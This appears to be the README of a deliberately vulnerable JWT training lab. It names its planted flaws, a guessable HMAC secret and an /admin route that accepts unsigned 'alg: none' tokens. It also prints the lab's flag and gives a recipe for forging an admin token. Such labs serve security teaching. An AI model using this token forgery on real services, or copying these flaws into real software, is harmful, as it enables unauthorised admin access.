# JWT Security Lab (Intentionally Vulnerable)

## Weaknesses

1. HMAC secret is `secret` (crackable / guessable)
2. `/admin` accepts `alg: none` tokens without signature

## Flag

```
KSL{jwt_none_alg_and_weak_secret}
```

## Example alg none token (payload role=admin)

Header: `{"alg":"none","typ":"JWT"}`  
Payload: `{"sub":"attacker","role":"admin"}`  
Signature: empty  

Base64url-encode and join with dots, then `Authorization: Bearer <token>`.

## Run

```bash
cd labs/jwt && npm install && npm start
# http://localhost:4005
```
